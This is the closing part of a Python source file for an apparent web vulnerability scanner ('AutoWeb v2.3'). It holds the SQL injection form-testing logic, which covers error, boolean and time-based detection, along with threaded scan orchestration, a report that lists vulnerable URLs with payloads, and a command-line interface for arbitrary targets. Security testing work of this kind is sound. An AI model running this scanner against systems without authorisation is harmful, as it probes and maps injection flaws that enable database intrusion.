        try:
            baseline_data = {}
            for inp in form['inputs']:
                if inp['type'] not in ['submit', 'button', 'reset', 'image']:
                    baseline_data[inp['name']] = inp.get('value', '1')

            if method == 'post':
                baseline_r = self.safe_request('post', url, data=baseline_data)
            else:
                baseline_r = self.safe_request('get', url, params=baseline_data)
            
            if baseline_r:
                baseline_length = len(baseline_r.text)
                baseline_status = baseline_r.status_code
            else:
                baseline_length = 0
                baseline_status = 200
        except Exception:
            baseline_length = 0
            baseline_status = 200

        for inp in form['inputs']:
            if inp['type'] in ['submit', 'button', 'reset', 'image', 'hidden']:
                continue

            for payload in self.get_sqli_payloads():
                try:
                    form_data = {}
                    for other_inp in form['inputs']:
                        if other_inp['name'] == inp['name']:
                            form_data[other_inp['name']] = payload
                        elif other_inp['type'] in ['submit', 'button', 'reset']:
                            continue
                        else:
                            form_data[other_inp['name']] = other_inp.get('value', 'test')

                    start_time = time.time()
                    if method == 'post':
                        r = self.safe_request('post', url, data=form_data)
                    else:
                        r = self.safe_request('get', url, params=form_data)
                    
                    if not r:
                        continue
                    elapsed = time.time() - start_time

                    if self.has_sqli_error(r.text):
                        findings.append({
                            'type': 'SQLi (Error - Form)',
                            'url': url,
                            'parameter': inp['name'],
                            'payload': payload[:200],
                            'method': method.upper(),
                            'full_url': url
                        })
                        break

                    if baseline_length > 0:
                        content_diff = abs(len(r.text) - baseline_length)
                        if content_diff > baseline_length * 0.3:
                            if any(x in payload.lower() for x in ['or', 'and', 'union']):
                                findings.append({
                                    'type': 'SQLi (Boolean - Form)',
                                    'url': url,
                                    'parameter': inp['name'],
                                    'payload': payload[:200],
                                    'method': method.upper(),
                                    'full_url': url
                                })
                                break

                    if elapsed >= self.timeout * 0.8:
                        if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark', 'pg_sleep', 'dbms_lock']):
                            findings.append({
                                'type': 'SQLi (Time - Form)',
                                'url': url,
                                'parameter': inp['name'],
                                'payload': payload[:200],
                                'method': method.upper(),
                                'detail': f'{elapsed:.2f}s',
                                'full_url': url
                            })
                            break

                except Timeout:
                    if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark', 'pg_sleep', 'dbms_lock']):
                        findings.append({
                            'type': 'SQLi (Time - Form)',
                            'url': url,
                            'parameter': inp['name'],
                            'payload': payload[:200],
                            'method': method.upper(),
                            'detail': 'Timed out',
                            'full_url': url
                        })
                        break
                except Exception:
                    continue

        return findings

    def scan_sqli(self):
        ColorPrint.bold("\n[===== SQLi SCAN =====]")
        all_findings = []
        payloads_count = len(self.get_sqli_payloads())

        # 1) Test URL parameters from crawled pages
        param_tasks = []
        for url in list(self.visited):
            params = self.extract_url_params(url)
            for param in params:
                param_tasks.append((url, param))

        # 2) Add discovered parameters
        if self.auto_detect:
            for param in self.all_parameters:
                if param not in [p for _, p in param_tasks]:
                    for url in list(self.discovered_urls)[:5]:
                        param_tasks.append((url, param))

        # 3) Add common parameters
        common_params = self.get_common_parameters()
        for param in common_params:
            if param not in [p for _, p in param_tasks]:
                for url in list(self.discovered_urls)[:3] + [self.target_url]:
                    param_tasks.append((url, param))

        if param_tasks:
            total = len(param_tasks)
            ColorPrint.info(f"[*] Testing {total} URL parameter(s) with {payloads_count} SQLi payloads each...")
            with ThreadPoolExecutor(max_workers=min(self.threads, len(param_tasks))) as executor:
                futures = {
                    executor.submit(self.test_sqli_reflected, url, param): (url, param)
                    for url, param in param_tasks
                }
                for future in as_completed(futures):
                    try:
                        result = future.result(timeout=self.timeout+5)
                        if result:
                            all_findings.append(result)
                            ColorPrint.payload_output('SQLi', result['url'], result['payload'], result['parameter'])
                            self.log_to_file(f"{result['url']}<{result['payload']}>")
                    except Exception as e:
                        continue

        # 4) Test forms
        if self.forms:
            ColorPrint.info(f"[*] Testing {len(self.forms)} form(s) with {payloads_count} SQLi payloads each...")
            with ThreadPoolExecutor(max_workers=min(self.threads, len(self.forms))) as executor:
                futures = {executor.submit(self.test_sqli_form, form): form for form in self.forms}
                for future in as_completed(futures):
                    try:
                        results = future.result(timeout=self.timeout+5)
                        for result in results:
                            all_findings.append(result)
                            ColorPrint.payload_output('SQLi', result['url'], result['payload'], result['parameter'])
                            self.log_to_file(f"{result['url']}<{result['payload']}>")
                    except Exception as e:
                        continue

        self.sqli_vulns = all_findings
        if not all_findings:
            ColorPrint.info("[*] No SQL injection vulnerabilities found.")
        else:
            ColorPrint.success(f"[+] Found {len(all_findings)} SQLi vulnerability(ies)")
        return all_findings

    # ────────────────────────────────────────
    # Reporting
    # ────────────────────────────────────────

    def generate_report(self):
        print("\n" + "=" * 70)
        ColorPrint.bold("                     FINAL REPORT")
        print("=" * 70)

        elapsed_time = datetime.now() - self.start_time
        
        print(f"\nTarget:      {self.target_url}")
        print(f"Domain:      {self.domain}")
        print(f"Pages crawled: {len(self.visited)}")
        print(f"Pages discovered: {len(self.discovered_urls)}")
        print(f"Forms discovered: {len(self.forms)}")
        print(f"WAF Detected: {self.waf_detected} ({self.waf_name})")
        print(f"Technologies: {', '.join(self.technologies) if self.technologies else 'Unknown'}")
        print(f"Parameters found: {len(self.all_parameters)}")
        print(f"XSS Payloads tested: {len(self.get_xss_payloads())}")
        print(f"SQLi Payloads tested: {len(self.get_sqli_payloads())}")
        print(f"Total requests made: {self.request_count}")
        print(f"Scan duration: {str(elapsed_time).split('.')[0]}")

        print("\n" + "-" * 70)
        ColorPrint.bold("XSS VULNERABILITIES (URL<PAYLOAD> format)")
        print("-" * 70)
        if self.xss_vulns:
            print("\n" + ColorPrint.BOLD + "Copy-paste these URLs for testing:" + ColorPrint.END + "\n")
            for vuln in self.xss_vulns:
                # Clean up URL for display
                url = vuln.get('full_url', vuln.get('url', ''))
                payload = vuln['payload']
                ColorPrint.payload_output('XSS', url, payload, vuln.get('parameter'))
        else:
            print("\n  None found.")

        print("\n" + "-" * 70)
        ColorPrint.bold("SQL INJECTION VULNERABILITIES (URL<PAYLOAD> format)")
        print("-" * 70)
        if self.sqli_vulns:
            print("\n" + ColorPrint.BOLD + "Copy-paste these URLs for testing:" + ColorPrint.END + "\n")
            for vuln in self.sqli_vulns:
                url = vuln.get('full_url', vuln.get('url', ''))
                payload = vuln['payload']
                ColorPrint.payload_output('SQLi', url, payload, vuln.get('parameter'))
                if 'detail' in vuln:
                    print(f"    {ColorPrint.CYAN}[Detail]{ColorPrint.END} {vuln['detail']}")
        else:
            print("\n  None found.")

        # Summary of vulnerable payloads (simple format)
        if self.xss_vulns or self.sqli_vulns:
            print("\n" + "-" * 70)
            ColorPrint.bold("QUICK REFERENCE - Vulnerable URLs")
            print("-" * 70 + "\n")
            
            if self.xss_vulns:
                ColorPrint.bold("XSS Vulnerabilities:")
                for vuln in self.xss_vulns:
                    url = vuln.get('full_url', vuln.get('url', ''))
                    payload = vuln['payload']
                    print(f"  {url}<{payload}>")
                    self.log_to_file(f"{url}<{payload}>")
            
            if self.sqli_vulns:
                ColorPrint.bold("\nSQL Injection Vulnerabilities:")
                for vuln in self.sqli_vulns:
                    url = vuln.get('full_url', vuln.get('url', ''))
                    payload = vuln['payload']
                    print(f"  {url}<{payload}>")
                    self.log_to_file(f"{url}<{payload}>")

        print("\n" + "=" * 70)
        ColorPrint.bold("                END OF REPORT")
        print("=" * 70)

        if self.output_file:
            self.output_handle.close()
            ColorPrint.success(f"[+] Results saved to: {self.output_file}")


# ────────────────────────────────────────
# Main
# ────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="AutoWeb v2.3 - Advanced XSS & SQLi Scanner with Payload Output Format",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python autoweb.py -u target.com
  python autoweb.py -u https://target.com --verbose
  python autoweb.py -u target.com -o results.txt
  python autoweb.py -u target.com --xss-only --threads 10
        """
    )

    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://target.com)')
    parser.add_argument('-o', '--output', help='Save results to file')
    parser.add_argument('--crawl-depth', type=int, default=2, help='Crawl depth (default: 2)')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests in seconds')
    parser.add_argument('--xss-only', action='store_true', help='Only scan for XSS')
    parser.add_argument('--sqli-only', action='store_true', help='Only scan for SQLi')
    parser.add_argument('--no-advanced', action='store_true', help='Disable advanced payloads')
    parser.add_argument('--no-auto-detect', action='store_true', help='Disable auto-detection')
    parser.add_argument('--cookie', type=str, help='Cookies (format: name1=value1; name2=value2)')
    parser.add_argument('--header', type=str, action='append', help='Custom headers (format: Name: Value)')
    parser.add_argument('--no-waf', action='store_true', help='Skip WAF detection')
    parser.add_argument('--verify-ssl', action='store_true', help='Verify SSL certificates')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    cookies = {}
    if args.cookie:
        for pair in args.cookie.split(';'):
            pair = pair.strip()
            if '=' in pair:
                k, v = pair.split('=', 1)
                cookies[k.strip()] = v.strip()

    headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                headers[k.strip()] = v.strip()

    print(r"""
     ___       _        ____ _    _______        __
    / _ \__ _ | |_  ___/ ___| |  |_   _\ \      / /
   | | |/ _` || __|/ _ \ |   | |    | |  \ \ /\ / / 
   | |_| (_| || |_|  __/ |___| |___ | |   \ V  V /  
    \___/\__,_| \__|\___|\____|_____|_|    \_/\_/   
                                                     
   AutoWeb v2.3 - XSS & SQLi Scanner (Payload Output)
   Authorized Security Testing Only
    """)

    # Ensure URL has scheme
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'http://' + args.url

    scanner = AutoWebScanner(
        target_url=args.url,
        threads=args.threads,
        timeout=args.timeout,
        cookies=cookies,
        headers=headers,
        crawl_depth=args.crawl_depth,
        delay=args.delay,
        xss_advanced=not args.no_advanced,
        sqli_advanced=not args.no_advanced,
        auto_detect=not args.no_auto_detect,
        output_file=args.output,
        verbose=args.verbose,
    )

    if not args.no_waf:
        print(scanner.detect_waf())
        print()

    # Auto-detection phase
    if scanner.auto_detect:
        ColorPrint.info("[*] Auto-detection phase started...")
        scanner.discover_common_paths()
        scanner.test_for_tech_identified_pages()
        scanner.discover_dynamic_parameters()
        ColorPrint.info(f"[*] Auto-detection complete. Discovered {len(scanner.discovered_urls)} URLs and {len(scanner.all_parameters)} parameters.")
        print()

    ColorPrint.info("[*] Starting crawl...")
    scanner.crawl(args.url)
    ColorPrint.info(f"[*] Crawl complete. Visited {len(scanner.visited)} page(s), "
          f"found {len(scanner.forms)} form(s).")

    if not args.sqli_only:
        scanner.scan_xss()
    if not args.xss_only:
        scanner.scan_sqli()

    scanner.generate_report()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
